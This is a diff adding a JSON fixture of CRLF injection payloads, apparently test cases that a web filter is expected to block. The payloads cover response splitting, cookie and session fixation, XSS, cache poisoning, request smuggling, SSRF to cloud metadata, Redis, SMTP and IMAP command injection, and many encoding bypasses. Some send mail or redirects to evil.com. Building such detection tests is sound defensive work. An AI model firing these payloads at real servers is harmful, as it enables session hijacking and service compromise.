@@ -1,0 +1,569 @@
+[
+  {
+    "id": "CRLF-RESPONSE-SPLIT-001",
+    "payload": "GET /api/redirect?url=http://example.com%0d%0aSet-Cookie:%20admin=true HTTP/1.1",
+    "tags": ["crlf", "response-splitting", "cookie-injection", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "CRLF injection for Set-Cookie header injection",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-RESPONSE-SPLIT-002",
+    "payload": "GET /api/redirect?url=http://example.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>Injected</html>",
+    "tags": ["crlf", "response-splitting", "http-injection", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Full HTTP response injection via CRLF",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-RESPONSE-SPLIT-003",
+    "payload": "GET /api/page?name=test%0d%0aX-Injected-Header:%20malicious HTTP/1.1",
+    "tags": ["crlf", "header-injection", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom header injection via CRLF",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-RESPONSE-SPLIT-004",
+    "payload": "GET /api/redirect?url=%0d%0aLocation:%20http://evil.com HTTP/1.1",
+    "tags": ["crlf", "open-redirect", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "CRLF to inject Location header for redirect",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-RESPONSE-SPLIT-005",
+    "payload": "GET /api/user?name=test%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>alert(1)</script>",
+    "tags": ["crlf", "xss", "response-splitting", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "CRLF with XSS payload injection",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-HEADER-001",
+    "payload": "GET /api/data HTTP/1.1\r\nHost: target.com\r\nX-Forwarded-For: 127.0.0.1%0d%0aX-Admin:%20true",
+    "tags": ["crlf", "header-injection", "privilege-escalation", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Header injection via X-Forwarded-For",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-HEADER-002",
+    "payload": "GET /api/data HTTP/1.1\r\nHost: target.com\r\nUser-Agent: Mozilla%0d%0aX-Injected:%20value",
+    "tags": ["crlf", "header-injection", "user-agent", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "CRLF injection in User-Agent header",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-HEADER-003",
+    "payload": "GET /api/data HTTP/1.1\r\nHost: target.com\r\nReferer: http://legitimate.com%0d%0aCookie:%20session=hijacked",
+    "tags": ["crlf", "header-injection", "cookie-injection", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Cookie injection via CRLF in Referer",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-HEADER-004",
+    "payload": "GET /api/data HTTP/1.1\r\nHost: target.com%0d%0aX-Forwarded-Host:%20evil.com",
+    "tags": ["crlf", "host-header", "cache-poisoning", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "CRLF in Host header for cache poisoning",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-ENCODING-001",
+    "payload": "GET /api/redirect?url=http://example.com%0a%0dSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "encoding", "lf-cr", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "LF-CR instead of CR-LF sequence",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-ENCODING-002",
+    "payload": "GET /api/redirect?url=http://example.com%0dSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "encoding", "cr-only", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "CR-only line ending for header injection",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-ENCODING-003",
+    "payload": "GET /api/redirect?url=http://example.com%0aSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "encoding", "lf-only", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "LF-only line ending for header injection",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-ENCODING-004",
+    "payload": "GET /api/redirect?url=http://example.com%E5%98%8A%E5%98%8DSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "unicode", "bypass", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Unicode CRLF bypass (U+560A U+560D)",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-ENCODING-005",
+    "payload": "GET /api/redirect?url=http://example.com%c0%8d%c0%8aSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "overlong-utf8", "bypass", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Overlong UTF-8 CRLF encoding bypass",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-ENCODING-006",
+    "payload": "GET /api/redirect?url=http://example.com%250d%250aSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "double-encode", "bypass", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Double URL-encoded CRLF",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-ENCODING-007",
+    "payload": "GET /api/redirect?url=http://example.com\\r\\nSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "escaped", "bypass", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Backslash-escaped CRLF",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-ENCODING-008",
+    "payload": "GET /api/redirect?url=http://example.com%u000d%u000aSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "iis-unicode", "bypass", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "IIS %u Unicode CRLF encoding",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-LOG-INJECTION-001",
+    "payload": "GET /api/login?user=admin%0d%0a[SUCCESS]%20admin%20logged%20in HTTP/1.1",
+    "tags": ["crlf", "log-injection", "forensics", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Log injection via CRLF - fake success entry",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-LOG-INJECTION-002",
+    "payload": "GET /api/action?type=transfer%0d%0a127.0.0.1%20-%20admin%20[timestamp]%20\"GET%20/admin%20HTTP/1.1\"%20200 HTTP/1.1",
+    "tags": ["crlf", "log-injection", "forensics", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Log injection with fake access log entry",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-SMTP-001",
+    "payload": "POST /api/contact HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nemail=test@example.com%0d%0aBcc:%20attacker@evil.com",
+    "tags": ["crlf", "smtp-injection", "email", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "SMTP header injection via email form",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-SMTP-002",
+    "payload": "POST /api/contact HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nfrom=test@example.com%0d%0aSubject:%20Phishing%0d%0a%0d%0aClick%20here:%20http://evil.com",
+    "tags": ["crlf", "smtp-injection", "email", "phishing", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Full email injection with custom body",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-CACHE-POISON-001",
+    "payload": "GET /api/page HTTP/1.1\r\nHost: target.com\r\nX-Forwarded-Host: evil.com%0d%0aX-Forwarded-Proto:%20https",
+    "tags": ["crlf", "cache-poisoning", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Cache poisoning via CRLF header injection",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-CACHE-POISON-002",
+    "payload": "GET /api/js/app.js HTTP/1.1\r\nHost: target.com%0d%0aX-Cache-Key:%20evil",
+    "tags": ["crlf", "cache-poisoning", "cache-key", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Cache key injection via CRLF in Host",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-SESSION-FIXATION-001",
+    "payload": "GET /api/redirect?url=http://example.com%0d%0aSet-Cookie:%20PHPSESSID=attacker_session HTTP/1.1",
+    "tags": ["crlf", "session-fixation", "cookie", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Session fixation via CRLF Set-Cookie injection",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-SESSION-FIXATION-002",
+    "payload": "GET /api/redirect?url=http://example.com%0d%0aSet-Cookie:%20JSESSIONID=attacker_session;%20Path=/;%20HttpOnly HTTP/1.1",
+    "tags": ["crlf", "session-fixation", "java", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Java session fixation with full cookie attributes",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-XSS-001",
+    "payload": "GET /api/redirect?url=http://example.com%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.domain)</script>",
+    "tags": ["crlf", "xss", "response-splitting", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "XSS via CRLF response body injection",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-XSS-002",
+    "payload": "GET /api/data?callback=test%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a<script>alert(1)</script>",
+    "tags": ["crlf", "xss", "xss-protection-bypass", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "XSS with X-XSS-Protection header bypass",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-CORS-001",
+    "payload": "GET /api/data HTTP/1.1\r\nHost: target.com\r\nOrigin: http://legitimate.com%0d%0aAccess-Control-Allow-Origin:%20http://evil.com",
+    "tags": ["crlf", "cors-bypass", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "CORS bypass via CRLF header injection",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-CORS-002",
+    "payload": "GET /api/data HTTP/1.1\r\nHost: target.com%0d%0aAccess-Control-Allow-Origin:%20*%0d%0aAccess-Control-Allow-Credentials:%20true",
+    "tags": ["crlf", "cors-bypass", "credential-theft", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Inject permissive CORS headers with credentials",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-CSP-BYPASS-001",
+    "payload": "GET /api/page HTTP/1.1\r\nHost: target.com%0d%0aContent-Security-Policy:%20default-src%20*",
+    "tags": ["crlf", "csp-bypass", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "CSP bypass via CRLF header injection",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-CSP-BYPASS-002",
+    "payload": "GET /api/page HTTP/1.1\r\nHost: target.com%0d%0aContent-Security-Policy:%20script-src%20'unsafe-inline'%20'unsafe-eval'",
+    "tags": ["crlf", "csp-bypass", "xss-enabler", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Inject permissive CSP allowing inline scripts",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-WEBSOCKET-001",
+    "payload": "GET /api/ws HTTP/1.1\r\nHost: target.com\r\nUpgrade: websocket%0d%0aSec-WebSocket-Key:%20attacker_key",
+    "tags": ["crlf", "websocket", "hijacking", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "WebSocket hijacking via CRLF in Upgrade header",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-PATH-001",
+    "payload": "GET /api/file%0d%0aX-Injected:%20true HTTP/1.1",
+    "tags": ["crlf", "path-injection", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "CRLF injection in URL path",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-PATH-002",
+    "payload": "GET /api/file%0d%0a%0d%0a<html>Injected</html> HTTP/1.1",
+    "tags": ["crlf", "path-injection", "response-body", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Full response body injection via URL path",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-POST-BODY-001",
+    "payload": "POST /api/data HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nname=test%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>",
+    "tags": ["crlf", "post-body", "response-splitting", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Response splitting via POST body parameter",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-JSON-001",
+    "payload": "POST /api/data HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"name\":\"test\\r\\nX-Injected: true\"}",
+    "tags": ["crlf", "json", "header-injection", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "CRLF in JSON value for header injection",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-COOKIE-001",
+    "payload": "GET /api/data HTTP/1.1\r\nHost: target.com\r\nCookie: session=abc%0d%0aX-Admin:%20true",
+    "tags": ["crlf", "cookie", "header-injection", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Header injection via CRLF in Cookie header",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-MULTILINE-001",
+    "payload": "GET /api/redirect?url=http://example.com%0d%0aSet-Cookie:%20a=1%0d%0aSet-Cookie:%20b=2%0d%0aSet-Cookie:%20c=3 HTTP/1.1",
+    "tags": ["crlf", "multi-header", "cookie-injection", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Multiple cookie injection via single CRLF chain",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-CHUNKED-001",
+    "payload": "GET /api/data HTTP/1.1\r\nHost: target.com%0d%0aTransfer-Encoding:%20chunked",
+    "tags": ["crlf", "chunked", "smuggling", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Inject Transfer-Encoding for smuggling setup",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-CONTENT-LENGTH-001",
+    "payload": "GET /api/data HTTP/1.1\r\nHost: target.com%0d%0aContent-Length:%200%0d%0a%0d%0aPOST%20/admin%20HTTP/1.1",
+    "tags": ["crlf", "content-length", "request-smuggling", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Request smuggling via CRLF Content-Length injection",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-HRS-001",
+    "payload": "GET /api/page%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d%0aGET%20/admin HTTP/1.1",
+    "tags": ["crlf", "request-splitting", "hrs", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "HTTP Request Splitting via path injection",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-CONTINUATION-001",
+    "payload": "GET /api/data HTTP/1.1\r\nHost: target.com\r\nX-Custom: value%0d%0a%20continuation%0d%0aX-Injected:%20true",
+    "tags": ["crlf", "header-continuation", "bypass", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Header continuation (obs-fold) abuse",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-NULL-BYTE-001",
+    "payload": "GET /api/redirect?url=http://example.com%00%0d%0aSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "null-byte", "bypass", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Null byte before CRLF to bypass filters",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-TAB-001",
+    "payload": "GET /api/redirect?url=http://example.com%0d%0a%09Set-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "tab", "whitespace-bypass", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Tab character after CRLF for header confusion",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-GRAPHQL-001",
+    "payload": "POST /graphql HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"query\":\"mutation { updateUser(name: \\\"test\\r\\nX-Admin: true\\\") }\"}",
+    "tags": ["crlf", "graphql", "header-injection", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "CRLF injection in GraphQL mutation",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-API-KEY-001",
+    "payload": "GET /api/data HTTP/1.1\r\nHost: target.com\r\nX-API-Key: valid_key%0d%0aX-Admin-Key:%20backdoor",
+    "tags": ["crlf", "api-key", "privilege-escalation", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Admin key injection via CRLF in API key header",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-AUTHORIZATION-001",
+    "payload": "GET /api/data HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer token%0d%0aX-Override-Auth:%20admin",
+    "tags": ["crlf", "authorization", "bypass", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Auth bypass via CRLF in Authorization header",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-SSRF-CHAIN-001",
+    "payload": "GET /api/proxy?url=http://internal%0d%0aHost:%20169.254.169.254 HTTP/1.1",
+    "tags": ["crlf", "ssrf", "cloud-metadata", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "SSRF + CRLF to access cloud metadata",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-LDAP-001",
+    "payload": "GET /api/user?dn=cn=admin%0d%0a%0d%0a HTTP/1.1",
+    "tags": ["crlf", "ldap", "injection", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "CRLF in LDAP DN parameter",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-REDIS-001",
+    "payload": "GET /api/cache?key=test%0d%0aSET%20admin%20true%0d%0a HTTP/1.1",
+    "tags": ["crlf", "redis", "command-injection", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Redis command injection via CRLF",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-MEMCACHED-001",
+    "payload": "GET /api/cache?key=test%0d%0aset%20admin%200%200%201%0d%0a1%0d%0a HTTP/1.1",
+    "tags": ["crlf", "memcached", "command-injection", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Memcached command injection via CRLF",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-FTP-001",
+    "payload": "GET /api/download?file=test.txt%0d%0aUSER%20anonymous%0d%0aPASS%20evil@example.com%0d%0a HTTP/1.1",
+    "tags": ["crlf", "ftp", "command-injection", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "FTP command injection via CRLF",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-IMAP-001",
+    "payload": "GET /api/email?folder=INBOX%0d%0aLOGIN%20admin%20password%0d%0a HTTP/1.1",
+    "tags": ["crlf", "imap", "command-injection", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "IMAP command injection via CRLF",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-PERCENT-ENCODED-MIXED-001",
+    "payload": "GET /api/redirect?url=http://example.com%0D%0aSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "mixed-encoding", "bypass", "critical"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Mixed case percent encoding (uppercase D, lowercase a)",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-HTML-ENTITY-001",
+    "payload": "GET /api/redirect?url=http://example.com&#13;&#10;Set-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "html-entity", "bypass", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "HTML entity encoded CRLF (decimal)",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-HTML-ENTITY-002",
+    "payload": "GET /api/redirect?url=http://example.com&#x0d;&#x0a;Set-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "html-entity", "hex", "bypass", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "HTML entity encoded CRLF (hexadecimal)",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-BASE64-001",
+    "payload": "GET /api/decode?data=aHR0cDovL2V4YW1wbGUuY29tDQpTZXQtQ29va2llOiBldmlsPXRydWU= HTTP/1.1",
+    "tags": ["crlf", "base64", "encoded", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Base64 encoded CRLF payload",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-DOUBLE-CRLF-001",
+    "payload": "GET /api/redirect?url=http://example.com%0d%0d%0a%0aSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "double-crlf", "bypass", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Double CRLF sequence bypass attempt",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-REVERSE-001",
+    "payload": "GET /api/redirect?url=http://example.com%0a%0dSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "reverse", "lf-cr", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Reversed LF-CR instead of CR-LF",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-FRAGMENT-001",
+    "payload": "GET /api/redirect?url=http://example.com#fragment%0d%0aSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "fragment", "bypass", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "CRLF after URL fragment",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-QUERY-001",
+    "payload": "GET /api/redirect?url=http://example.com?query=1%0d%0aSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "query-string", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "CRLF in URL with existing query string",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-PADDING-001",
+    "payload": "GET /api/redirect?url=http://example.com%20%20%20%0d%0aSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "padding", "whitespace", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Whitespace padding before CRLF",
+    "category": "Injection"
+  },
+  {
+    "id": "CRLF-COMMENT-001",
+    "payload": "GET /api/redirect?url=http://example.com/*comment*/%0d%0aSet-Cookie:%20evil=true HTTP/1.1",
+    "tags": ["crlf", "comment", "bypass", "high"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Comment-style chars before CRLF",
+    "category": "Injection"
+  }
+]
